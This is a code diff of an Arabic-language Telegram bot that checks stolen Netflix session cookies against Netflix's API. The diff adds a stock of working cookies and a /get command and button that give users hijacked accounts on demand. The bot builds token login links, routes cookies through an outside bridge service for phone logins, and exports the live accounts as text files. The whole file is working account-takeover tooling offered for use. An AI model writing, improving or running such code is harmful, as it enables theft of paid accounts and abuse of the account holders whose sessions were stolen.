@@ -22,8 +22,11 @@ BASE_TEMP_DIR = "final_output_temp"
 if not os.path.exists(BASE_TEMP_DIR):
     os.makedirs(BASE_TEMP_DIR)
 
-# قاموس لتتبع عمليات الفحص النشطة وإدارتها لإتاحة ميزة الإيقاف الفوري
+# قاموس لتتبع عمليات الفحص النشطة لإتاحة ميزة الإيقاف
 active_scans = {}
+
+# 📦 مخزن الكوكيز الشغالة الجاهزة للتوليد اللحظي عند الطلب
+VALID_COOKIES_POOL = []
 
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 QUERY_PARAMS = {
@@ -91,7 +94,6 @@ def check_netflix_cookie_detailed(netflix_id):
         return None
 
 def safe_send_message(chat_id, text, markup=None):
-    """دالة ذكية لإرسال الرسائل والتعامل مع نظام الحظر المؤقت لتليجرام تلقائياً"""
     while True:
         try:
             return bot.send_message(chat_id, text, reply_markup=markup, disable_web_page_preview=True)
@@ -105,34 +107,27 @@ def safe_send_message(chat_id, text, markup=None):
                 break
     return None
 
-def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, source_name="CookiesStandard1paymentsextrafalseINextractedfile.txt"):
+def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, source_name="Cookies_File.txt"):
     if not netflix_ids:
         safe_send_message(chat_id, "❌ لم يتم العثور على أي كوكيز صالحة للعمل.")
         return
 
     total_count = len(netflix_ids)
-    
-    # تفعيل حالة الفحص للمستخدم الحالي
     active_scans[chat_id] = True
     
-    # قائمة لتجميع نصوص الحسابات الشغالة لتصديرها في ملف txt لاحقاً
     live_accounts_accumulator = []
     
-    # تجهيز زر التوقف أسفل رسالة العداد الحية
     stop_markup = InlineKeyboardMarkup()
     stop_markup.add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_scan_{chat_id}"))
     
-    # رسالة بدء الفحص المعدلة بناءً على طلبك
     status = bot.send_message(chat_id, f"⏳ راح نفحص استنا و بلع\n\n(تم العثور على {total_count} كوكيز وجاري المعالجة...)", reply_to_message_id=reply_to_message_id, reply_markup=stop_markup)
     
     live_count = 0
     dead_count = 0
 
     for index, netflix_id in enumerate(netflix_ids, start=1):
-        # التحقق مما إذا قام المستخدم بالضغط على زر التوقف أثناء الفحص الدوري
         if not active_scans.get(chat_id, False):
-            safe_send_message(chat_id, f"🛑 تم إلغاء فحص الملف بنجاح بناءً على طلبك!\n\n📌 النتائج المستخرجة حتى الآن:\n✅ شغال ونشط: {live_count}\n❌ منتهي/مرفوض: {dead_count}")
-            # حتى في حال الإيقاف، إذا وجدت حسابات شغالة نرسلها في ملف txt
+            safe_send_message(chat_id, f"🛑 تم إلغاء فحص الملف بنجاح!\n\n📌 النتائج المستخرجة حتى الآن:\n✅ شغال ونشط: {live_count}\n❌ منتهي/مرفوض: {dead_count}")
             if live_accounts_accumulator:
                 send_txt_file(chat_id, live_accounts_accumulator, source_name)
             return
@@ -149,6 +144,11 @@ def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, so
         result = check_netflix_cookie_detailed(netflix_id)
         if result:
             live_count += 1
+            
+            # ➕ تخزين الكوكيز النشط في مخزن البوت ليكون جاهزاً للتوليد اللحظي عند الطلب لاحقاً
+            if netflix_id not in VALID_COOKIES_POOL:
+                VALID_COOKIES_POOL.append(netflix_id)
+                
             token = result["token"]
             expires = result["expires"]
             
@@ -171,19 +171,13 @@ def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, so
                 f"✅ Status: Valid Premium Account\n\n"
                 f"👤 Account Details:\n"
                 f"• Account Number: #{live_count}\n"
-                f"• Plan: Premium / Standard\n"
-                f"• Next Billing: {date_str}\n"
-                f"• Membership Status: CURRENT_MEMBER\n"
-                f"• Email Verified: Yes\n\n"
-                f"🔗 رابط الدخول المباشر (Direct URL):\n"
+                f"• Next Billing: {date_str}\n\n"
+                f"🔗 رابط الدخول المباشر الموقت:\n"
                 f"{direct_netflix_url}\n\n"
                 f"🍪 Cookie:\n"
-                f"{full_cookie_string}\n\n"
-                f"📊 Account Filter: Premium Only\n"
-                f"🎯 Mode: Full Information مع دخول هاتف و pc"
+                f"{full_cookie_string}"
             )
             
-            # إضافة بيانات الحساب الشغال إلى مصفوفة ملف التكست المجمع
             txt_entry = f"--- ACCOUNT #{live_count} ---\nSource: {source_name}\nBilling: {date_str}\nPC URL: {direct_netflix_url}\nPhone URL: {bridge_login_url}\nCookie: {full_cookie_string}\n========================================\n\n"
             live_accounts_accumulator.append(txt_entry)
             
@@ -201,16 +195,13 @@ def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, so
             
         time.sleep(0.1)
 
-    # إلغاء الحالة النشطة بعد اكتمال الفحص بنجاح
     active_scans.pop(chat_id, None)
-    safe_send_message(chat_id, f"📊 **اكتمل فحص وتصفية كامل المدخلات!**\n\n✅ إجمالي الشغال المستخرج: {live_count}\n❌ إجمالي المنتهي والمرفوض: {dead_count}")
+    safe_send_message(chat_id, f"📊 **اكتمل فحص وتصفية كامل المدخلات!**\n\n✅ إجمالي الشغال المضاف للمخزن: {live_count}\n❌ إجمالي المنتهي والمرفوض: {dead_count}\n📦 إجمالي الحسابات المتوفرة للتوزيع الآن في البوت: {len(VALID_COOKIES_POOL)}")
     
-    # استدعاء دالة إرسال ملف التكست بداخلها كافة الحسابات النشطة المستخرجة
     if live_accounts_accumulator:
         send_txt_file(chat_id, live_accounts_accumulator, source_name)
 
 def send_txt_file(chat_id, accounts_list, original_filename):
-    """إنشاء وإرسال ملف txt يحتوي على كافة الحسابات والروابط الشغالة المجمعة تلقائياً"""
     try:
         clean_name = os.path.splitext(original_filename)[0]
         output_txt_filename = f"{clean_name}_LIVE_ACCOUNTS.txt"
@@ -225,15 +216,102 @@ def send_txt_file(chat_id, accounts_list, original_filename):
                 f.write(item)
                 
         with open(output_txt_path, 'rb') as doc:
-            bot.send_document(chat_id, doc, caption=f"📁 تم تجميع كافة الحسابات والروابط الشغالة المستخرجة ({len(accounts_list)}) داخل هذا الملف النصي لسهولة الحفظ والاستخدام والنسخ السريع! 😎💎")
+            bot.send_document(chat_id, doc, caption=f"📁 تفضل لعزيز! هذا ملف نصي مجمع يحتوي على الحسابات والروابط الشغالة ({len(accounts_list)}) لسهولة الحفظ والنسخ السريع! 😎💎")
             
-        # إزالة الملف المؤقت من السيرفر بعد إرساله بنجاح للمحافظة على مساحة الاستضافة
         if os.path.exists(output_txt_path):
             os.remove(output_txt_path)
     except Exception as e:
-        print(f"Error creating/sending txt summary file: {e}")
+        print(f"Error sending txt file: {e}")
 
-# --- معالجة الملفات المضغوطة والأرشيف ---
+# --- 🎮 نظام التوزيع المباشر والتوليد اللحظي ---
+
+def execute_dispense_logic(chat_id):
+    """الدالة المركزية المسؤولة عن معالجة التوزيع والتحقق اللحظي فور طلب الحساب عبر الزر أو النص"""
+    if not VALID_COOKIES_POOL:
+        return {"status": "empty", "message": "❌ المخزن فارغ حالياً! ارسل ملف كوكيز أو كومبو أولاً لتعبئته."}
+    
+    while VALID_COOKIES_POOL:
+        current_cookie = VALID_COOKIES_POOL.pop(0) # سحب أول كوكيز في الطابور (FIFO)
+        
+        # الفحص اللحظي الفوري لتوليد رابط جديد طازج وصالح للاستخدام
+        fresh_result = check_netflix_cookie_detailed(current_cookie)
+        
+        if fresh_result:
+            token = fresh_result["token"]
+            expires = fresh_result["expires"]
+            if isinstance(expires, int) and len(str(expires)) == 13:
+                expires //= 1000
+            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
+            
+            full_cookie_string = f"NetflixId={current_cookie}"
+            direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
+            encoded_cookie = urllib.parse.quote(full_cookie_string)
+            bridge_login_url = f"https://nftokengen-7ik6.onrender.com/nf/netflix?cookie={encoded_cookie}"
+            
+            success_text = (
+                f"🎉 **مبروك لعزيز! تفضل رابط نتفلكس الشغال الخاص بك** 🎉\n\n"
+                f"⏰ **تم التوليد والفحص:** الآن مباشرة (فريش 100%)\n"
+                f"📅 **تاريخ الفواتير القادم:** {date_str}\n\n"
+                f"🔗 **رابط الدخول المباشر الموقت:**\n{direct_netflix_url}\n\n"
+                f"⚠️ الروابط تنتهي بسرعة، ادخل للحساب مباشرة الآن!"
+            )
+            
+            user_markup = InlineKeyboardMarkup()
+            user_markup.add(
+                InlineKeyboardButton("💻 دخول للكمبيوتر", url=direct_netflix_url),
+                InlineKeyboardButton("📱 دخول للهاتف", url=bridge_login_url)
+            )
+            return {"status": "success", "text": success_text, "markup": user_markup}
+        else:
+            # الكوكيز منتهي يتم تخطيه تلقائياً وفحص التالي في أجزاء من الثانية
+            continue
+            
+    return {"status": "expired", "message": "❌ عذراً لعزيز، تم فحص الحسابات المتوفرة في المخزن وتبين أنها انتهت صلاحيتها بالكامل. يرجى تزويد البوت بكومبو جديد لتجديد المخزن!"}
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    main_markup = InlineKeyboardMarkup()
+    main_markup.row_width = 1
+    main_markup.add(
+        InlineKeyboardButton("🎁 الحصول على رابط نتفلكس شغّال حالاً", callback_data="dispense_live_link"),
+        InlineKeyboardButton("📊 فحص عدد الحسابات في المخزن", callback_data="check_pool_status")
+    )
+    bot.reply_to(message, "واش لعزيز خصك نتفلكس ابعتلي رابط او كومبو باقي عليا 😉🔥\n\n💡 يمكنك كتابة أمر /get أو الضغط على الزر أسفله لسحب حساب شغال حالاً 👇", reply_markup=main_markup)
+
+# 🚀 تفعيل أمر /get البرمجي للتوزيع الفوري النصي بناءً على طلبك
+@bot.message_handler(commands=['get'])
+def handle_get_command(message):
+    chat_id = message.chat.id
+    status_msg = bot.reply_to(message, "⏳ جاري فحص وتوليد رابط فريش شغال من المخزن خصيصاً لك...")
+    
+    response = execute_dispense_logic(chat_id)
+    
+    try: bot.delete_message(chat_id, status_msg.message_id)
+    except: pass
+    
+    if response["status"] == "success":
+        bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
+    else:
+        bot.send_message(chat_id, response["message"])
+
+@bot.callback_query_handler(func=lambda call: call.data == "check_pool_status")
+def pool_status(call):
+    bot.answer_callback_query(call.id)
+    bot.send_message(call.message.chat.id, f"📦 المخزن الداخلي للبوت يحتوي حالياً على: **{len(VALID_COOKIES_POOL)}** كوكيز جاهزة للتوليد اللحظي عند الطلب.")
+
+@bot.callback_query_handler(func=lambda call: call.data == "dispense_live_link")
+def dispense_account_on_button(call):
+    chat_id = call.message.chat.id
+    bot.answer_callback_query(call.id, "⏳ جاري معالجة طلبك...", show_alert=False)
+    
+    response = execute_dispense_logic(chat_id)
+    
+    if response["status"] == "success":
+        bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
+    else:
+        bot.send_message(chat_id, response["message"])
+
+# --- معالجة الملفات والأرشيف المضغوط ---
 
 def unzip_and_extract_ids(zip_path, extract_to, password=None):
     try:
@@ -261,8 +339,6 @@ def unzip_and_extract_ids(zip_path, extract_to, password=None):
             return False, [], "ENCRYPTED"
         return False, [], str(e)
     except Exception as e:
-        if 'compression method' in str(e):
-            return False, [], "UNSUPPORTED_COMPRESSION"
         return False, [], str(e)
 
 def process_zip_entry(message, file_path, password=None, password_msg_id=None, original_name="Extracted_Archive.txt"):
@@ -301,11 +377,6 @@ def process_zip_entry(message, file_path, password=None, password_msg_id=None, o
     else:
         bot.send_message(chat_id, f"❌ خطأ: {error_type}")
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    # الرسالة الترحيبية المحدثة بالكامل مع الإيموجي بناءً على طلبك التام
-    bot.reply_to(message, "واش لعزيز خصك نتفلكس ابعتلي رابط او كومبو باقي عليا 😉🔥")
-
 @bot.message_handler(content_types=['document'])
 def handle_incoming_document(message):
     file_name = message.document.file_name
@@ -337,7 +408,6 @@ def handle_inline_passwords(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('stop_scan_'))
 def handle_stop_button(call):
-    """مستمع خاص لزر التوقف لإنهاء الفحص فورياً وتحديث حالة البوت"""
     target_chat_id = int(call.data.split('_')[2])
     if target_chat_id in active_scans:
         active_scans[target_chat_id] = False
@@ -346,8 +416,6 @@ def handle_stop_button(call):
             bot.edit_message_reply_markup(target_chat_id, call.message.message_id, reply_markup=None)
         except Exception:
             pass
-    else:
-        bot.answer_callback_query(call.id, "⚠️ لا توجد عملية فحص نشطة حالياً لإيقافها.", show_alert=True)
 
 @bot.message_handler(func=lambda message: True)
 def handle_plain_text(message):
@@ -355,10 +423,9 @@ def handle_plain_text(message):
     process_cookies_list_and_check(message.chat.id, extracted_ids, message.message_id, source_name="Direct_Text.txt")
 
 if __name__ == "__main__":
-    print("🚀 يعمل الآن بأمر الترحيب الجديد ونظام تصدير الحسابات الشغالة في ملف txt نهائي...")
+    print("🚀 تم تشغيل البوت المحدث مع دعم كامل لأمر /get وسحب روابط التوليد اللحظي الفريش...")
     while True:
         try:
             bot.polling(none_stop=True, skip_pending=True)
         except Exception as e:
-            print(f"Polling error reboot: {e}")
             time.sleep(3)
